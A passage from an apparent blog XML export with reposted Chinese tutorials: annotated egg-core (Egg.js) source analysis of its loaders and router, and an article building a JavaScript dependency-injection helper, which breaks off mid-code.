又是 Router 类的实例，Router 类是基于 koa-router 实现的 12345678910111213141516171819202122232425262728// egg-core 源码 -&gt; loadRouter 函数源码实现loadRouter() &#123; this.loadFile(this.resolveModule(path.join(this.options.baseDir, 'app/router')));&#125;//设置 router 属性的 get 方法get router() &#123; //缓存设置 if (this[ROUTER]) &#123; return this[ROUTER]; &#125; //新建 Router 实例，其中 Router 类是继承 koa-router 实现的 const router = this[ROUTER] = new Router(&#123; sensitive: true &#125;, this); //在启动前将 router 中间件载入引用 this.beforeStart(() =&gt; &#123; this.use(router.middleware()); &#125;); return router;&#125;//将 router 上所有的 method 函数代理到 EggCore 上，这样我们就可以通过 app.get('/async', ...asyncMiddlewares, 'subController.subHome.async1') 的方式配置路由utils.methods.concat([ 'all', 'resources', 'register', 'redirect' ]).forEach(method =&gt; &#123; EggCore.prototype[method] = function(...args) &#123; this.router[method](...args); return this; &#125;;&#125;) Router 类继承了 KoaRouter 类，并对其的 method 相关函数做了扩展，解析 controller 的写法，同时提供了 resources 方法，为了兼容 restAPI 的请求方式 关于 restAPI 的使用方式和实现源码我们这里就不介绍了，可以看官方文档，有具体的格式要求，下面看一下 Router 类的部分实现逻辑： 1234567891011121314151617181920212223242526272829303132333435363738394041424344// egg-core源码 -&gt; Router 类实现源码class Router extends KoaRouter &#123; constructor(opts, app) &#123; super(opts); this.app = app; //对 method 方法进行扩展 this.patchRouterMethod(); &#125; patchRouterMethod() &#123; //为了支持 generator 函数类型，以及获取 controller 类中导出的中间件 methods.concat([ 'all' ]).forEach(method =&gt; &#123; this[method] = (...args) =&gt; &#123; // spliteAndResolveRouterParams 主要是为了拆分 router.js 中的路由规则，将其拆分成普通中间件和 controller 生成的中间件部分，请看下文源码 const splited = spliteAndResolveRouterParams(&#123; args, app: this.app &#125;); args = splited.prefix.concat(splited.middlewares); return super[method](...args); &#125;; &#125;); &#125; //返回 router 里每个路由规则的前缀和中间件部分 function spliteAndResolveRouterParams(&#123; args, app &#125;) &#123; let prefix; let middlewares; if (args.length &gt;= 3 &amp;&amp; (is.string(args[1]) || is.regExp(args[1]))) &#123; // app.get(name, url, [...middleware], controller) 的形式 prefix = args.slice(0, 2); middlewares = args.slice(2); &#125; else &#123; // app.get(url, [...middleware], controller) 的形式 prefix = args.slice(0, 1); middlewares = args.slice(1); &#125; // controller 部分肯定是最后一个 const controller = middlewares.pop(); // resolveController 函数主要是为了处理 router.js 中关于 controller 的两种写法： //写法 1 ：app.get('/async', ...asyncMiddlewares, 'subController.subHome.async1') //写法 2 ：app.get('/async', ...asyncMiddlewares, subController.subHome.async1) //最终从 app.controller 上获取到真正的 controller 中间件，resolveController 具体函数实现就不介绍了 middlewares.push(resolveController(controller, app)); return &#123; prefix, middlewares &#125;; &#125; 总结以上便是我对 egg-core 的大部分源码的实现的学习总结，其中关于源码中一些 debug 代码以及 timing 运行时间记录的代码都删掉了，关于 app 的生命周期管理的那部分代码和 loadUnits 加载逻辑关系不大，所以没有讲到。EggCore 的核心在于 EggLoader，也就是 plugin，config, extend, service, middleware, controller, router 的加载函数，而这几个内容加载必须按照顺序进行加载，存在依赖关系，比如： 加载 middleware 时会用到 config 关于应用中间件的配置 加载 router 时会用到关于 controller 的配置 而 config，extend，service，middleware，controller 的加载都必须依赖于 plugin，通过 plugin 配置获取插件目录 service，middleware，controller，router 的加载又必须依赖于 extend（对 app 进行扩展），因为如果 exports 是函数的情况下，会将 app 作为参数执行函数 EggCore 是一个基础框架，其最重要的是需要遵循一定的约束和约定，可以保证一致的代码风格，而且提供了插件和框架机制，能使相同的业务逻辑实现复用，后面看有时间再写一下 Egg 框架的源码学习心得 参考文献 egg-core 源码分析 agg-core 源码 egg 源码 egg 官方文档]]></content>
      <categories>
        <category>Node.js</category>
      </categories>
      <tags>
        <tag>Node.js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Egg 源码分析之 egg-core（一）]]></title>
    <url>%2F2020%2F02%2F14%2FNode.js%2FEgg%20%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E4%B9%8B%20egg-core%EF%BC%88%E4%B8%80%EF%BC%89%2F</url>
    <content type="text"><![CDATA[转载自知乎网络，原文链接：https://zhuanlan.zhihu.com/p/47178799 egg-core 是什么应用、框架、插件之间的关系在学习 egg-core 是什么之前，我们先了解一下关于 Egg 框架中应用、框架、插件这三个概念及其之间的关系： 一个应用必须指定一个框架才能运行起来，根据需要我们可以给一个应用配置多个不同的插件； 插件只完成特定独立的功能，实现即插即拔的效果； 框架是一个启动器，必须有它才能运行起来。框架还是一个封装器，它可以在已有框架的基础上进行封装，框架也可以配置插件，其中 Egg，EggCore 都是框架； 在框架的基础上还可以扩展出新的框架，也就是说框架是可以无限级继承的，有点像类的继承； 框架、应用、插件的关于 service/controller/config/middleware 的目录结构配置基本相同，称之为加载单元（loadUnit），包括后面源码分析中的 getLoadUnits 函数都是为了获取这个结构； 12345678910111213141516171819202122# 加载单元的目录结构如下图，其中插件和框架没有 controller 和 router.js# 这个目录结构很重要，后面所有的 load 方法都是针对这个目录结构进行的 loadUnit ├── package.json ├── app │ ├── extend │ | ├── helper.js │ | ├── request.js │ | ├── response.js │ | ├── context.js │ | ├── application.js │ | └── agent.js │ ├── service | ├── controller │ ├── middleware │ └── router.js └── config ├── config.default.js ├── config.prod.js ├── config.test.js ├── config.local.js └── config.unittest.js egg-core 的主要工作Egg.js 的大部分核心代码实现都在 egg-core 库 中，egg-core 主要 export 四个对象: EggCore 类：继承于 Koa ，做一些初始化工作， EggCore 中最主要的一个属性是 loader ，也就是 egg-core 的导出的第二个类 EggLoader 的实例 EggLoader 类：整个框架目录结构（controller，service，middleware，extend，router.js）的加载和初始化工作都在该类中实现的，主要提供了几个 load 函数(loadPlugin，loadConfig，loadMiddleware，loadService，loadController，loadRouter 等)，这些函数会根据指定目录结构下文件输出形式不同进行适配，最终挂载输出内容。 BaseContextClass 类：这个类主要是为了我们在使用框架开发时，在 controller 和 service 作为基类使用，只有继承了该类，我们才可以通过 this.ctx 获取到当前请求的上下文对象 utils 对象：提供几个主要的函数，包括转换成中间件函数 middleware ，根据不同类型文件获取文件导出内容函数 loadFile 等 所以 egg-core 做的主要事情就是根据 loadUnit 的目录结构规范，将目录结构中的 config，controller，service，middleware，plugin，router 等文件 load 到 app 或者 context 上，开发人员只要按照这套约定规范，就可以很方便进行开发，以下是 egg-core 的 exports 对象源码： 123456789101112// egg-core 源码 -&gt; 导出的数据结构const EggCore = require('./lib/egg');const EggLoader = require('./lib/loader/egg_loader');const BaseContextClass = require('./lib/utils/base_context_class');const utils = require('./lib/utils');module.exports = &#123; EggCore, EggLoader, BaseContextClass, utils,&#125;; EggCore 的具体实现源码学习EggCore 类源码学习EggCore 类是算是上文提到的框架范畴，它从 Koa 类继承而来，并做了一些初始化工作，其中有三个主要属性是： loader ：这个对象是 EggLoader 的实例，定义了多个 load 函数，用于对 loadUnit 目录下的文件进行加载，后面后专门讲这个类的是实现; router ：是 EggRouter 类的实例，从 KoaRouter 继承而来，用于 Egg 框架的路由管理和分发，这个类的实现在后面的 loadRouter 函数会有说明 lifecycle ：这个属性用于 app 的生命周期管理，由于和整个文件加载逻辑关系不大，所以这里不作说明 123456789101112131415161718192021222324252627282930313233343536373839// egg-core 源码 -&gt; EggCore 类的部分实现const KoaApplication = require('koa');const EGG_LOADER = Symbol.for('egg#loader');class EggCore extends KoaApplication &#123; constructor(options = &#123;&#125;) &#123; super(); const Loader = this[EGG_LOADER]; //初始化 loader 对象 this.loader = new Loader(&#123; baseDir: options.baseDir, //项目启动的根目录 app: this, // EggCore 实例本身 plugins: options.plugins, //自定义插件配置信息，设置插件配置信息有多种方式，后面我们会讲 logger: this.console, serverScope: options.serverScope, &#125;); &#125; get [EGG_LOADER]() &#123; return require('./loader/egg_loader'); &#125; // router 对象 get router() &#123; if (this[ROUTER]) &#123; return this[ROUTER]; &#125; const router = this[ROUTER] = new Router(&#123; sensitive: true &#125;, this); this.beforeStart(() =&gt; &#123; this.use(router.middleware()); &#125;); return router; &#125; // 生命周期对象初始化 this.lifecycle = new Lifecycle(&#123; baseDir: options.baseDir, app: this, logger: this.console, &#125;);&#125; EggLoader 类源码学习如果说 EggCore 是 Egg 框架的精华所在，那么 EggLoader 可以说是 EggCore 的精华所在，下面我们主要从 EggLoader 的实现细节开始学习 EggCore 这个库： EggLoader 首先对 app 中的一些基本信息（pkg/eggPaths/serverEnv/appInfo/serverScope/baseDir 等）进行整理，并且定义一些基础共用函数(getEggPaths/getTypeFiles/getLoadUnits/loadFile)，所有的这些基础准备都是为了后面介绍的几个 load 函数作准备，我们下面看一下其基础部分的实现： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899// egg-core源码 -&gt; EggLoader 中基本属性和基本函数的实现class EggLoader &#123; constructor(options) &#123; this.options = options; this.app = this.options.app; //pkg 是根目录的 package.json 输出对象 this.pkg = utility.readJSONSync(path.join(this.options.baseDir, 'package.json')); // eggPaths 是所有框架目录的集合体，虽然我们上面提到一个应用只有一个框架，但是框架可以在框架的基础上实现多级继承，所以是多个 eggPath //在实现框架类的时候，必须指定属性 Symbol.for('egg#eggPath') ，这样才能找到框架的目录结构 //下面有关于 getEggPaths 函数的实现分析 this.eggPaths = this.getEggPaths(); this.serverEnv = this.getServerEnv(); //获取 app 的一些基本配置信息(name,baseDir,env,scope,pkg 等) this.appInfo = this.getAppInfo(); this.serverScope = options.serverScope !== undefined ? options.serverScope : this.getServerScope(); &#125; //递归获取继承链上所有 eggPath getEggPaths() &#123; const EggCore = require('../egg'); const eggPaths = []; let proto = this.app; //循环递归的获取原型链上的框架 Symbol.for('egg#eggPath') 属性 while (proto) &#123; proto = Object.getPrototypeOf(proto); //直到 proto 属性等于 EggCore 本身，说明到了最上层的框架类，停止循环 if (proto === Object.prototype || proto === EggCore.prototype) &#123; break; &#125; const eggPath = proto[Symbol.for('egg#eggPath')]; const realpath = fs.realpathSync(eggPath); if (!eggPaths.includes(realpath)) &#123; eggPaths.unshift(realpath); &#125; &#125; return eggPaths; &#125; //函数输入：config 或者 plugin ，函数输出：当前环境下的所有配置文件 //该函数会根据 serverScope，serverEnv 的配置信息，返回当前环境对应 filename 的所有配置文件 //比如我们的 serverEnv=prod，serverScope=online，那么返回的 config 配置文件是 ['config.default', 'config.online', 'config.prod', 'config.online_prod'] //这几个文件加载顺序非常重要，因为最终获取到的 config 信息会进行深度的覆盖，后面的文件信息会覆盖前面的文件信息 getTypeFiles(filename) &#123; const files = [ `$&#123;filename&#125;.default` ]; if (this.serverScope) files.push(`$&#123;filename&#125;.$&#123;this.serverScope&#125;`); if (this.serverEnv === 'default') return files; files.push(`$&#123;filename&#125;.$&#123;this.serverEnv&#125;`); if (this.serverScope) files.push(`$&#123;filename&#125;.$&#123;this.serverScope&#125;_$&#123;this.serverEnv&#125;`); return files; &#125; //获取框架、应用、插件的 loadUnits 目录集合，上文有关于 loadUnits 的说明 //这个函数在下文中介绍的 loadSerivce,loadMiddleware,loadConfig,loadExtend 中都会用到，因为 plugin，framework，app 中都会有关系这些信息的配置 getLoadUnits() &#123; if (this.dirs) &#123; return this.dirs; &#125; const dirs = this.dirs = []; //插件目录，关于 orderPlugins 会在后面的loadPlugin函数中讲到 if (this.orderPlugins) &#123; for (const plugin of this.orderPlugins) &#123; dirs.push(&#123; path: plugin.path, type: 'plugin', &#125;); &#125; &#125; //框架目录 for (const eggPath of this.eggPaths) &#123; dirs.push(&#123; path: eggPath, type: 'framework', &#125;); &#125; //应用目录 dirs.push(&#123; path: this.options.baseDir, type: 'app', &#125;); return dirs; &#125; //这个函数用于读取某个 loadUnit 下的文件具体内容，包括 js 文件，json 文件及其它普通文件 loadFile(filepath, ...inject) &#123; if (!filepath || !fs.existsSync(filepath)) &#123; return null; &#125; if (inject.length === 0) inject = [ this.app ]; let ret = this.requireFile(filepath); //这里要注意，如果某个 js 文件导出的是一个函数，且不是一个 Class，那么Egg认为这个函数的格式是：app =&gt; &#123;&#125;,输入是 EggCore 实例，输出是真正需要的信息 if (is.function(ret) &amp;&amp; !is.class(ret)) &#123; ret = ret(...inject); &#125; return ret; &#125;&#125; 各个 loader 函数的实现源码分析上文中只是介绍了 EggLoader 中的一些基本属性和函数，那么如何将 loadUnits 中的不同类型的文件分别加载进来呢，eggCore 中每一种类型（service/controller 等）的文件加载都在一个独立的文件里实现。比如我们加载 controller 文件可以通过 ‘./mixin/controller’ 目录下的 loadController 完成，加载 service 文件可以通过 ‘./mixin/service’ 下的 loadService 函数完成，然后将这些方法挂载 EggLoader 的原型上，这样就可以直接在 EggLoader 的实例上使用 12345678910111213141516// egg-core 源码 -&gt; 混入不同目录文件的加载方法到 EggLoader 的原型上const loaders = [ require('./mixin/plugin'), // loadPlugin方法 require('./mixin/config'), // loadConfig方法 require('./mixin/extend'), // loadExtend方法 require('./mixin/custom'), // loadCustomApp和loadCustomAgent方法 require('./mixin/service'), // loadService方法 require('./mixin/middleware'), // loadMiddleware方法 require('./mixin/controller'), // loadController方法 require('./mixin/router'), // loadRouter方法];for (const loader of loaders) &#123; Object.assign(EggLoader.prototype, loader);&#125; 我们按照上述 loaders 中定义的元素顺序，对各个 load 函数的源码实现进行一一分析： loadPlugin 函数插件是一个迷你的应用，没有包含 router.js 和 controller 文件夹，我们上文也提到，应用和框架里都可以包含插件，而且还可以通过环境变量和初始化参数传入，关于插件初始化的几个参数： enable： 是否开启插件 env： 选择插件在哪些环境运行 path： 插件的所在路径 package： 和 path 只能设置其中一个，根据 package 名称去 node_modules 里查询 plugin ，后面源码里有详细说明 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172// egg-core 源码 -&gt; loadPlugin 函数部分源码loadPlugin() &#123; //加载应用目录下的 plugins // readPluginConfigs 这个函数会先调用我们上文提到的 getTypeFiles 获取到 app 目录下所有的 plugin 文件名，然后按照文件顺序进行加载并合并，并规范 plugin 的数据结构 const appPlugins = this.readPluginConfigs(path.join(this.options.baseDir, 'config/plugin.default')); //加载框架目录下的 plugins const eggPluginConfigPaths = this.eggPaths.map(eggPath =&gt; path.join(eggPath, 'config/plugin.default')); const eggPlugins = this.readPluginConfigs(eggPluginConfigPaths); //可以通过环境变量 EGG_PLUGINS 配置 plugins，从环境变量加载 plugins let customPlugins; if (process.env.EGG_PLUGINS) &#123; try &#123; customPlugins = JSON.parse(process.env.EGG_PLUGINS); &#125; catch (e) &#123; debug('parse EGG_PLUGINS failed, %s', e); &#125; &#125; //从启动参数 options 里加载 plugins //启动参数的 plugins 和环境变量的 plugins 都是自定义的 plugins，可以对默认的应用和框架 plugin 进行覆盖 if (this.options.plugins) &#123; customPlugins = Object.assign(&#123;&#125;, customPlugins, this.options.plugins); &#125; this.allPlugins = &#123;&#125;; this.appPlugins = appPlugins; this.customPlugins = customPlugins; this.eggPlugins = eggPlugins; //按照顺序对 plugin 进行合并及覆盖 // _extendPlugins 在合并的过程中，对相同 name 的 plugin 中的属性进行覆盖，有一个特殊处理的地方，如果某个属性的值是空数组，那么不会覆盖前者 this._extendPlugins(this.allPlugins, eggPlugins); this._extendPlugins(this.allPlugins, appPlugins); this._extendPlugins(this.allPlugins, customPlugins); const enabledPluginNames = []; const plugins = &#123;&#125;; const env = this.serverEnv; for (const name in this.allPlugins) &#123; const plugin = this.allPlugins[name]; // plugin 的 path 可能是直接指定的，也有可能指定了一个 package 的 name，然后从 node_modules 中查找 //从 node_modules 中查找的顺序是：&#123;APP_PATH&#125;/node_modules -&gt; &#123;EGG_PATH&#125;/node_modules -&gt; $CWD/node_modules plugin.path = this.getPluginPath(plugin, this.options.baseDir); //这个函数会读取每个 plugin.path 路径下的 package.json，获取 plugin 的 version，并会使用 package.json 中的 dependencies，optionalDependencies, env 变量作覆盖 this.mergePluginConfig(plugin); // 有些 plugin 只有在某些环境（serverEnv）下才能使用，否则改成 enable=false if (env &amp;&amp; plugin.env.length &amp;&amp; !plugin.env.includes(env)) &#123; plugin.enable = false; continue; &#125; //获取 enable=true 的所有 pluginnName plugins[name] = plugin; if (plugin.enable) &#123; enabledPluginNames.push(name); &#125; &#125; //这个函数会检查插件的依赖关系，插件的依赖关系在 dependencies 中定义，最后返回所有需要的插件 //如果 enable=true 的插件依赖的插件不在已有的插件中，或者插件的依赖关系存在循环引用，则会抛出异常 //如果 enable=true 的依赖插件为 enable=false，那么该被依赖的插件会被改为 enable=true this.orderPlugins = this.getOrderPlugins(plugins, enabledPluginNames, appPlugins); //最后我们以对象的方式将 enable=true 的插件挂载在 this 对象上 const enablePlugins = &#123;&#125;; for (const plugin of this.orderPlugins) &#123; enablePlugins[plugin.name] = plugin; &#125; this.plugins = enablePlugins;&#125; loadConfig 函数配置信息的管理对于一个应用来说非常重要，我们需要对不同的部署环境的配置进行管理，Egg 就是针对环境加载不同的配置文件，然后将配置挂载在 app 上， 加载 config 的逻辑相对简单，就是按照顺序加载所有 loadUnits 目录下的 config 文件内容，进行合并，最后将 config 信息挂载在 this 对象上，整个加载函数请看下面源码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152// egg-core 源码 -&gt; loadConfig 函数分析loadConfig() &#123; this.configMeta = &#123;&#125;; const target = &#123;&#125;; //这里之所以先加载 app 相关的 config ，是因为在加载 plugin 和 framework 的 config 时会使用到 app 的 config const appConfig = this._preloadAppConfig(); // config的加载顺序为：plugin config.default -&gt; framework config.default -&gt; app config.default -&gt; plugin config.&#123;env&#125; -&gt; framework config.&#123;env&#125; -&gt; app config.&#123;env&#125; for (const filename of this.getTypeFiles('config')) &#123; // getLoadUnits 函数前面有介绍，获取 loadUnit 目录集合 for (const unit of this.getLoadUnits()) &#123; const isApp = unit.type === 'app'; //如果是加载插件和框架下面的 config，那么会将 appConfig 当作参数传入 //这里 appConfig 已经加载了一遍了，又重复加载了，不知道处于什么原因，下面会有 _loadConfig 函数源码分析 const config = this._loadConfig(unit.path, filename, isApp ? undefined : appConfig, unit.type); if (!config) &#123; continue; &#125; // config 进行覆盖 extend(true, target, config); &#125; &#125; this.config = target;&#125;_loadConfig(dirpath, filename, extraInject, type) &#123; const isPlugin = type === 'plugin'; const isApp = type === 'app'; let filepath = this.resolveModule(path.join(dirpath, 'config', filename)); //如果没有 config.default 文件，则用 config.js 文件替代，隐藏逻辑 if (filename === 'config.default' &amp;&amp; !filepath) &#123; filepath = this.resolveModule(path.join(dirpath, 'config/config')); &#125; // loadFile 函数我们在 EggLoader 中讲到过，如果 config 导出的是一个函数会先执行这个函数，将函数的返回结果导出，函数的参数也就是[this.appInfo extraInject] const config = this.loadFile(filepath, this.appInfo, extraInject); if (!config) return null; //框架使用哪些中间件也是在 config 里作配置的，后面关于 loadMiddleware 函数实现中有说明 // coreMiddleware 只能在框架里使用 if (isPlugin || isApp) &#123; assert(!config.coreMiddleware, 'Can not define coreMiddleware in app or plugin'); &#125; // middleware 只能在应用里定义 if (!isApp) &#123; assert(!config.middleware, 'Can not define middleware in ' + filepath); &#125; //这里是为了设置 configMeta，表示每个配置项是从哪里来的 this[SET_CONFIG_META](config, filepath); return config; &#125; loadExtend 相关函数这里的 loadExtend 是一个笼统的概念，其实是针对 Koa 中的 app.response，app.respond，app.context 以及 app 本身进行扩展，同样是根据所有 loadUnits 下的配置顺序进行加载 下面看一下 loadExtend 这个函数的实现，一个通用的加载函数： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546// egg-core -&gt; loadExtend 函数实现// name输入是 "response"/"respond"/"context"/"app" 中的一个，proto 是被扩展的对象loadExtend(name, proto) &#123; //获取指定 name 所有 loadUnits 下的配置文件路径 const filepaths = this.getExtendFilePaths(name); const isAddUnittest = 'EGG_MOCK_SERVER_ENV' in process.env &amp;&amp; this.serverEnv !== 'unittest'; for (let i = 0, l = filepaths.length; i &lt; l; i++) &#123; const filepath = filepaths[i]; filepaths.push(filepath + `.$&#123;this.serverEnv&#125;`); if (isAddUnittest) filepaths.push(filepath + '.unittest'); &#125; //这里并没有对属性的直接覆盖，而是对原先的 PropertyDescriptor 的 get 和 set 进行合并 const mergeRecord = new Map(); for (let filepath of filepaths) &#123; filepath = this.resolveModule(filepath); const ext = this.requireFile(filepath); const properties = Object.getOwnPropertyNames(ext) .concat(Object.getOwnPropertySymbols(ext)); for (const property of properties) &#123; let descriptor = Object.getOwnPropertyDescriptor(ext, property); let originalDescriptor = Object.getOwnPropertyDescriptor(proto, property); if (!originalDescriptor) &#123; const originalProto = originalPrototypes[name]; if (originalProto) &#123; originalDescriptor = Object.getOwnPropertyDescriptor(originalProto, property); &#125; &#125; //如果原始对象上已经存在相关属性的 Descriptor，那么对其 set 和 get 方法进行合并 if (originalDescriptor) &#123; descriptor = Object.assign(&#123;&#125;, descriptor); if (!descriptor.set &amp;&amp; originalDescriptor.set) &#123; descriptor.set = originalDescriptor.set; &#125; if (!descriptor.get &amp;&amp; originalDescriptor.get) &#123; descriptor.get = originalDescriptor.get; &#125; &#125; //否则直接覆盖 Object.defineProperty(proto, property, descriptor); mergeRecord.set(property, filepath); &#125; &#125; &#125; 参考文献 egg-core 源码分析 agg-core 源码 egg 源码 egg 官方文档]]></content>
      <categories>
        <category>Node.js</category>
      </categories>
      <tags>
        <tag>Node.js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript里的依赖注入]]></title>
    <url>%2F2020%2F02%2F11%2FWeb%E5%89%8D%E7%AB%AF%2FJavaScript%E9%87%8C%E7%9A%84%E4%BE%9D%E8%B5%96%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[转载自网络，原文链接：https://yanhaijing.com/javascript/2014/01/24/dependency-injection-in-javascript/ 我喜欢引用这句话，“程序是对复杂性的管理”。计算机世界是一个巨大的抽象建筑群。我们简单的包装一些东西然后发布新工具，周而复始。现在思考下，你所使用的语言包括的一些内建的抽象函数或是低级操作符。这在 JavaScript 里是一样的。 迟早你需要用到其他开发人员的抽象成果——即你依靠别人的代码。我喜欢依赖自由（无依赖）的模块，但那是难以实现的。甚至你创建的那些漂亮的黑盒子组件也或多或少会依赖一些东西。这正是依赖注入大显身手的之处。现在有效地管理依赖的能力是绝对必要的。本文总结了我对问题探索和一些的解决方案。 目标设想我们有两个模块。第一个是负责Ajax请求服务（service），第二个是路由（router）。 123456789101112var service = function() &#123; return &#123; name: &apos;Service&apos; &#125;;&#125;var router = function() &#123; return &#123; name: &apos;Router&apos; &#125;;&#125;我们有另一个函数需要用到这两个模块。var doSomething = function(other) &#123; var s = service(); var r = router();&#125;; 为使看起来更有趣，这函数接受一个参数。当然，我们完全可以使用上面的代码，但这显然不够灵活。如果我们想使用ServiceXML或ServiceJSON呢,或者如果我们需要一些测试模块呢。我们不能仅靠编辑函数体来解决问题。首先，我们可以通过函数的参数来解决依赖性。即： 1234var doSomething = function(service, router, other) &#123; var s = service(); var r = router();&#125;; 我们通过传递额外的参数来实现我们想要的功能，然而，这会带来新的问题。想象如果我们的doSomething 方法散落在我们的代码中。如果我们需要更改依赖条件，我们不可能更改所有调用函数的文件。 我们需要一个能帮我们搞定这些的工具。这就是依赖注入尝试解决的问题。让我们写下一些我们的依赖注入解决办法应该达到的目标： 我们应该能够注册依赖关系 注入应该接受一个函数，并返回一个我们需要的函数 我们不能写太多东西——我们需要精简漂亮的语法 注入应该保持被传递函数的作用域 被传递的函数应该能够接受自定义参数，而不仅仅是依赖描述 堪称完美的清单，下面 让我们实现它。 RequireJS / AMD的方法你可能对RequireJS早有耳闻，它是解决依赖注入不错的选择。 123define([&apos;service&apos;, &apos;router&apos;], function(service, router) &#123; // ...&#125;); 这种想法是先描述需要的依赖，然后再写你的函数。这里参数的顺序很重要。如上所说，让我们写一个叫做injector的模块，能接受相同的语法。 123456var doSomething = injector.resolve([&apos;service&apos;, &apos;router&apos;], function(service, router, other) &#123; expect(service().name).to.be(&apos;Service&apos;); expect(router().name).to.be(&apos;Router&apos;); expect(other).to.be(&apos;Other&apos;);&#125;);doSomething(&quot;Other&quot;); 再继续之前我应该解释清楚doSomething函数体内容，我使用expect.js （断言方面的库）仅是为了保证我写的代码的行为和我期望的是一样的，体现一点点TDD（测试驱动开发）方法。 下面开始我们的injector模块，这是非常棒的一个单例模式，所以它能在我们程序的不同部分工作的很好。 123456789var injector = &#123; dependencies: &#123;&#125;, register: function(key, value) &#123; this.dependencies[key] = value; &#125;, resolve: function(deps, func, scope) &#123; &#125;&#125; 这是一个非常简单的对象，有两个方法，一个用来存储的属性。我们要做的是检查deps数组并在dependencies变量中搜索答案。剩下的只是调用.apply方法并传递之前的func方法的参数。 12345678910111213resolve: function(deps, func, scope) &#123; var args = []; for(var i=0; i&lt;deps.length, d=deps[i]; i++) &#123; if(this.dependencies[d]) &#123; args.push(this.dependencies[d]); &#125; else &#123; throw new Error(&apos;Can\&apos;t resolve &apos; + d); &#125; &#125; return function() &#123; func.apply(scope || &#123;&#125;, args.concat(Array.prototype.slice.call(arguments, 0))); &#125; &#125; scope是可选的，Array.prototype.slice.call(arguments, 0)是必须的，用来将arguments变量转换为真正的数组。到目前为止还不错。我们的测试通过了。这种实现的问题是，我们需要写所需部件两次，并且我们不能混淆他们的顺序。附加的自定义参数总是位于依赖之后。 反射方法根据维基百科的定义反射是指一个程序在运行时检查和修改一个对象的结构和行为的能力。简单的说，在JavaScript的上下文里，这具体指读取和分析的对象或函数的源代码。让我们完成文章开头提到的doSomething函数。如果你在控制台输出doSomething.tostring()。你将得到如下的字符串： 1234&quot;function (service, router, other) &#123; var s = service(); var r = router();&#125;&quot; 通过此方法返回的字符串给我们遍历参数的能力，更重要的是，能够获取他们的名字。这其实是Angular 实现它的依赖注入的方法。我偷了一点懒，直接截取Angular代码中获取参数的正则表达式。 1/^function\s*[^\(]*\(\s*([^\)]*)\)/m 我们可以像下面这样修改resolve 的代码： 1234567891011121314resolve: function() &#123; var func, deps, scope, args = [], self = this; func = arguments[0]; deps = func.toString().match(/^function\s*[^\(]*\(\s*([^\)]*)\)/m)[1].replace(/ /g, &apos;&apos;).split(&apos;,&apos;); scope = arguments[1] || &#123;&#125;; return function() &#123; var a = Array.prototype.slice.call(arguments, 0); for(var i=0; i&lt;deps.length; i++) &#123; var d = deps[i]; args.push(self.dependencies[d] &amp;&amp; d != &apos;&apos; ? self.dependencies[d] : a.shift()); &#125; func.apply(scope || &#123;&#125;, args); &#125; &#125; 我们执行正则表达式的结果如下： 12345[&quot;function (service, router, other)&quot;, &quot;service, router, other&quot;] 看起来，我们只需要第二项。一旦我们清楚空格并分割字符串就得到`deps`数组。只有一个大的改变：var a = Array.prototype.slice.call(arguments, 0);...args.push(self.dependencies[d] &amp;&amp; d != &apos;&apos; ? self.dependencies[d] : a.shift()); 我们循环遍历dependencies数组，如果发现缺失项则尝试从arguments对象中获取。谢天谢地，当数组为空时，shift方法只是返回undefined，而不是抛出一个错误（这得益于web的思想）。新版的injector 能像下面这样使用： 123456var doSomething = injector.resolve(function(service, other, router) &#123; expect(service().name).to.be(&apos;Service&apos;); expect(router().name).to.be(&apos;Router&apos;); expect(other).to.be(&apos;Other&apos;);&#125;);doSomething(&quot;Other&quot;); 不必重写依赖并且他们的顺序可以打乱。它仍然有效，我们成功复制了Angular的魔法。 然而，这种做法并不完美，这就是反射类型注射一个非常大的问题。压缩会破坏我们的逻辑，因为它改变参数的名字，我们将无法保持正确的映射关系。例如，doSometing()压缩后可能看起来像这样： 1var doSomething=function(e,t,n)&#123;var r=e();var i=t()&#125; Angular团队提出的解决方案看起来像： 123var doSomething = injector.resolve([&apos;service&apos;, &apos;router&apos;, function(service, router) &#123;&#125;]); 这看起来很像我们开始时的解决方案。我没能找到一个更好的解决方案，所以决定结合这两种方法。下面是injector的最终版本。 1234567891011121314151617181920212223242526var injector = &#123; dependencies: &#123;&#125;, register: function(key, value) &#123; this.dependencies[key] = value; &#125;, resolve: function() &#123; var func, deps, scope, args = [], self = this; if(typeof arguments[0] === &apos;string&apos;) &#123; func = arguments[1]; deps = arguments[0].replace(/ /g, &apos;&apos;).split(&apos;,&apos;); scope = arguments[2] || &#123;&#125;; &#125; else &#123; func = arguments[0]; deps = func.toString().match(/^function\s*[^\(]*\(\s*([^\)]*)\)/m)[1].replace(/ /g, &apos;&apos;).split(&apos;,&apos;); scope = arguments[1] || &#123;&#125;; &#125; return function() &#123; var a = Array.prototype.slice.call(arguments, 0); for(var i=0; i&lt;deps.length; i++) &#123; var d = deps[i]; args.push(self.dependencies[d] &amp;&amp; d != &apos;&apos; ? self.dependencies[d] : a.shift()); &#125; func.apply(scope || &#123;&#125;, args); &#125; &#125;&#125; resolve访客接受两或三个参数，如果有两个参数它实际上和文章前面写的一样。然而，如果有三个参数，它会将第一个参数转换并填充deps数组，下面是一个测试例子： 123456var doSomething = injector.resolve(&apos;router,,service&apos;, function(a, b, c) &#123; expect(a().name).to.be(&apos;Router&apos;); expect(b).to.be(&apos;Other&apos;); expect(c().name).to.be(&apos;Service&apos;);&#125;);doSomething(&quot;Other&quot;); 你可能注意到在第一个参数后面有两个逗号——注意这不是笔误。空值实际上代表“Other”参数（占位符）。这显示了我们是如何控制参数顺序的。 直接注入Scope有时我会用到第三个注入变量，它涉及到操作函数的作用域（换句话说，就是this对象）。所以，很多时候不需要使用这个变量。 1234567891011121314151617181920var injector = &#123; dependencies: &#123;&#125;, register: function(key, value) &#123; this.dependencies[key] = value; &#125;, resolve: function(deps, func, scope) &#123; var args = []; scope = scope || &#123;&#125;; for(var i=0; i&lt;deps.length, d=deps[i]; i++) &#123; if(this.dependencies[d]) &#123; scope[d] = this.dependencies[d]; &#125; else &#123; throw new Error(&apos;Can\&apos;t resolve &apos; + d); &#125; &#125; return function() &#123; 